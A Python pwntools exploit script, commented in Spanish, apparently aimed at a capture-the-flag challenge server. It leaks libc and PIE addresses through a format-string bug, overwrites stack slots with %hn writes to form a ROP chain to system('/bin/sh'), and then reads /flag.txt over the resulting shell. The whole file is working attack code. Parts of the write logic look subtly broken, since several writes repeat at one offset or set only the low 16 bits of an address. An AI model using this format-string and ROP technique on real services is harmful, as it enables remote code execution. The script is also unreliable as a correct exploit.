#!/usr/bin/env python3
from pwn import *
import struct

context.arch = 'amd64'
context.log_level = 'info'

# Cargar libc
libc = ELF('/tmp/arch_libc.so', checksec=False)

p = remote('txg.chal2.teagod.tech', 16767)

# ============ FASE 1: LEAKS ============
def get_leak(offset):
    p.sendline(b'1')
    p.recvuntil(b': ')
    p.sendline(f'%{offset}$p'.encode())
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b': ')
    p.sendline(b'0')
    p.recvuntil(b'username: ')
    data = p.recvline().decode()
    p.recvuntil(b'> ')
    import re
    m = re.findall(r'0x([0-9a-f]+)', data)
    return int(m[0], 16) if m else 0

leak_libc = get_leak(11)
leak_pie = get_leak(15)

libc_base = leak_libc - 0x277f0 - 0x151
pie_base = leak_pie - 0x1641

log.success(f"libc base: {hex(libc_base)}")
log.success(f"PIE base: {hex(pie_base)}")

# ============ FASE 2: ENCONTRAR DIRECCIÓN DEL OFFSET 18 ============
# Obtener addr17
p.sendline(b'1')
p.recvuntil(b': ')
p.sendline(b'%17$p')
p.recvuntil(b'> ')

p.sendline(b'2')
p.recvuntil(b': ')
p.sendline(b'0')
p.recvuntil(b'username: ')
data = p.recvline().decode()
import re
m = re.findall(r'0x([0-9a-f]+)', data)
addr17 = int(m[0], 16)
p.recvuntil(b'> ')

# La dirección del offset 18 en la pila es addr17 + 8
addr18_stack = addr17 + 8
log.info(f"Dirección del offset 18 en la pila: {hex(addr18_stack)}")

# Buscar qué offset apunta a addr18_stack
offset_to_18 = None
for i in range(1, 50):
    p.sendline(b'4')
    p.recvuntil(b': ')
    p.sendline(b'0')
    p.recvuntil(b': ')
    p.sendline(f'%{i}$p'.encode())
    p.recvuntil(b'> ')
    
    p.sendline(b'2')
    p.recvuntil(b': ')
    p.sendline(b'0')
    p.recvuntil(b'username: ')
    data = p.recvline().decode()
    p.recvuntil(b'> ')
    
    m = re.findall(r'0x([0-9a-f]+)', data)
    if m:
        val = int(m[0], 16)
        if val == addr18_stack:
            log.success(f"¡Offset {i} apunta a la dirección del offset 18!")
            offset_to_18 = i
            break

if not offset_to_18:
    log.error("No se encontró offset para offset 18")
    exit()

# ============ FASE 3: ESCRIBIR EN OFFSETS ============
def write_hn(offset, value):
    """Escribir 2 bytes en un offset usando %hn"""
    p.sendline(b'4')
    p.recvuntil(b': ')
    p.sendline(b'0')
    p.recvuntil(b': ')
    payload = f'%{value}c%{offset}$hn'.encode()
    p.sendline(payload)
    p.recvuntil(b'> ')

# Gadgets
ret_gadget = libc_base + 0x2720
pop_rdi = libc_base + 0x2775
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
system = libc_base + libc.symbols['system']
add_rsp_18 = pie_base + 0x1330

log.info(f"ret: {hex(ret_gadget)}")
log.info(f"pop rdi: {hex(pop_rdi)}")
log.info(f"/bin/sh: {hex(bin_sh)}")
log.info(f"system: {hex(system)}")

# Escribir ret en offset 18 (usando el offset que apunta a su dirección)
# Escribimos 8 bytes completos de ret_gadget
for i in range(0, 8, 2):
    word = (ret_gadget >> (i * 8)) & 0xffff
    write_hn(offset_to_18, word)

log.success("ret escrito en offset 18")

# Offset 17 → ret
write_hn(17, ret_gadget & 0xffff)

# Offset 19 → pop rdi (si es basura, primero escribimos ret allí también)
# Como offset 19 = basura, necesitamos su dirección también
# Simplificamos: si offset 19 no es usable, usamos offsets 20, 21, 22

# Usar offsets 20, 21, 22 para la ROP chain
write_hn(20, pop_rdi & 0xffff)
write_hn(21, bin_sh & 0xffff)
write_hn(22, system & 0xffff)

# Return address → add rsp, 0x18; ret
write_hn(15, add_rsp_18 & 0xffff)

log.success("ROP chain escrita")

# ============ FASE 4: EJECUTAR ============
p.sendline(b'6')  # exit
p.sendline(b'cat /flag.txt')
p.interactive()
